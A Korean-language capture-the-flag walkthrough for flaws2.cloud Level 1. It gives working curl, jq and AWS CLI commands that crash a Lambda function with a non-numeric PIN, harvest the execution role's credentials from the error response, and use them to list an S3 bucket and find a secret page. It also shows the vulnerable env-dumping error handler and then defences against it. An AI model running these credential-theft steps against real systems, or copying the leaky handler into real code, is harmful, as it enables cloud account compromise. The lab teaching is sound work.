# Attacker Level 1 — Lambda 에러 응답에서 자격증명 탈취

> **URL**: http://level1.flaws2.cloud/
> **API 엔드포인트**: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
> **핵심 기술**: 클라이언트 측 유효성 검사 우회 · Lambda 환경변수 유출
> **난이도**: ⭐⭐
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

페이지는 **"4자리 PIN"** 을 요구한다. 공식 힌트는 "**brute force 는 답이 아니다**" 라고 못 박는다. 클라이언트 측 검증만 있는 허술한 입력 처리를 **숫자가 아닌 값**으로 우회해 Lambda 를 크래시시키고, 응답에 노출된 **실행 역할의 임시 자격증명**으로 비밀 페이지를 찾는다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 페이지의 입력 유효성 검사는 **JavaScript 에만** 있습니다. 이를 우회하고 숫자가 아닌 PIN 을 보내보세요.

</details>

<details>
<summary><b>Hint 2</b></summary>

> 브라우저 콘솔에 보이는 요청 URL 은 `https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234` 입니다. `code` 를 `a` 로 바꿔 보세요. 서버가 내놓는 **에러 메시지** 를 주의 깊게 보세요.

</details>

<details>
<summary><b>Hint 3</b></summary>

> 응답에 **`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`** 이 들어 있습니다. AWS CLI 에 **환경변수** 로 설정하고 다음 레벨을 찾으세요.

</details>

## 📚 사전 지식

- Lambda 함수는 런타임 환경에서 **환경변수**에 자격증명을 심어 SDK 에 제공한다.
- 디버그용으로 `catch (err) { return err.message + JSON.stringify(process.env); }` 같은 구현을 해 두면 **크래시 응답에 env 전체가 붙어나온다** — flaws2 L1 이 정확히 이 패턴.
- `ASIA...` 로 시작하는 키는 **세션 토큰** 도 함께 있어야 사용 가능.

## 🔍 정찰

### 1. 페이지 소스에서 API 엔드포인트 확인
```bash
curl -s http://level1.flaws2.cloud/ | grep -Eo 'execute-api[^"]+' | head -1
# execute-api.us-east-1.amazonaws.com/default/level1
```

### 2. 정상 요청 (숫자) — 반응 확인
```bash
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234"
# 페이지가 "Incorrect" 로 리다이렉트됨
```

### 3. JS 검증 우회 — 숫자가 아닌 값 전송
```bash
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a"
```

## 🧨 취약점 원리

- **클라이언트 측에서만** 입력을 `isFinite(parseFloat(code))` 로 검증. 서버는 검증하지 않음.
- Lambda 코드가 숫자가 아닌 값을 처리하다 예외 발생.
- 예외 처리 로직이 "디버깅 편하라고" **`process.env` 를 그대로 직렬화**해 클라이언트로 되돌려줌 → **실행 역할 자격증명 외부 유출**.

## 🛠 풀이

### 1. 환경변수 덤프 받기
```bash
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a" > /tmp/l1env.txt
cat /tmp/l1env.txt | head -c 200
```
응답 모양:
```
Error, malformed input
{"AWS_REGION":"us-east-1","_HANDLER":"index.handler","AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"...","AWS_LAMBDA_FUNCTION_NAME":"level1",...}
```

### 2. JSON 부분만 추출해서 환경변수 셋업
```bash
# "Error, malformed input\n" 뒷부분이 JSON
tail -c +24 /tmp/l1env.txt > /tmp/l1env.json
jq -r '"export AWS_ACCESS_KEY_ID=\(.AWS_ACCESS_KEY_ID)
export AWS_SECRET_ACCESS_KEY=\(.AWS_SECRET_ACCESS_KEY)
export AWS_SESSION_TOKEN=\(.AWS_SESSION_TOKEN)"' /tmp/l1env.json > /tmp/l1creds.sh
source /tmp/l1creds.sh
aws sts get-caller-identity --region us-east-1
# Arn: arn:aws:sts::653711331788:assumed-role/level1/level1
```

### 3. Lambda 역할로 접근 가능한 리소스 탐색
`ListAllMyBuckets` 는 막혀 있지만, **도메인 규칙으로 레벨 버킷을 직접 지정**하면 `ListBucket` 이 통한다:
```bash
aws s3 ls s3://level1.flaws2.cloud/ --region us-east-1
```
예상:
```
2018-11-21 11:00:22       1905 hint1.htm
2018-11-21 11:00:22       2226 hint2.htm
2018-11-21 11:00:22       2536 hint3.htm
2018-11-21 11:00:22       2523 hint4.htm
2018-11-21 11:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

### 4. 비밀 페이지 열기
```bash
curl -s http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html \
  | grep -Eo 'level[0-9]-[^"]+flaws2\.cloud' | head -1
# level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
```

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 비밀 페이지: http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
- 다음 레벨: **http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/**
- 교훈:
  1. **서버에서도** 입력 유효성 검증할 것.
  2. **Lambda env 전체를 응답에 노출** 하는 디버그 코드 절대 금지.
  3. Lambda 실행 역할은 **최소권한** — 이 레벨 역할은 굳이 `s3:ListBucket level1.flaws2.cloud` 가 없어도 됐다.

</details>

## 🌍 실제 세계 사례

- 2022 년 Bug Bounty: 어느 SaaS 의 Lambda 가 에러 트래이스에 `process.env` 를 전체 포함 → Attacker 가 **LLM API 키 · DB 암호 · SES SMTP 비밀번호** 전부 수거.
- 비슷하게 **Stack trace 에 환경변수** 가 실리는 프레임워크 (Rails `config/environments/development.rb` 등)에서 흔한 실수.

## 🛡 방어 대책

### ① 에러 응답에 환경변수/스택트레이스 노출 금지
```javascript
// 나쁜 예
catch (err) { return { body: err.message + JSON.stringify(process.env) }; }

// 좋은 예
catch (err) {
  console.error(err);  // CloudWatch 에만 기록
  return { statusCode: 500, body: "Internal error" };
}
```

### ② 서버에서도 입력 검증
```javascript
if (!/^\d{4}$/.test(event.queryStringParameters.code)) {
  return { statusCode: 400, body: "Invalid code" };
}
```

### ③ 비밀은 환경변수가 아니라 Secrets Manager / Parameter Store
```javascript
import { SecretsManagerClient, GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";
const sm = new SecretsManagerClient({});
const pin = (await sm.send(new GetSecretValueCommand({ SecretId: "level1/pin" }))).SecretString;
```
환경변수로 PIN 을 넣어 둔 CTF 같은 실수도 이 구조면 피할 수 있다.

### ④ WAF / API Gateway throttling
`?code=` 에 정규식 조건 추가, 초당 요청 제한.

### ⑤ CloudWatch Log 필터
`AWS_ACCESS_KEY_ID` 가 응답에 포함되는 로그를 **Metric Filter 로 자동 탐지** 해 SNS 알림.

## ✅ 체크리스트

- [ ] 페이지 JS 에 클라이언트 검증만 있음을 DevTools 로 확인
- [ ] `?code=a` 요청으로 환경변수 JSON 덤프 확인
- [ ] `ASIA...` 키로 `aws sts get-caller-identity` 성공
- [ ] `s3 ls level1.flaws2.cloud` 에서 `secret-ppxVFdw...` 확인
- [ ] 본인 Lambda 에 동일 취약(env 덤프) 함수 작성 → CloudWatch 필터로 탐지 테스트

## ⏭ 다음

[Attacker Level 2 →](level-02.md)
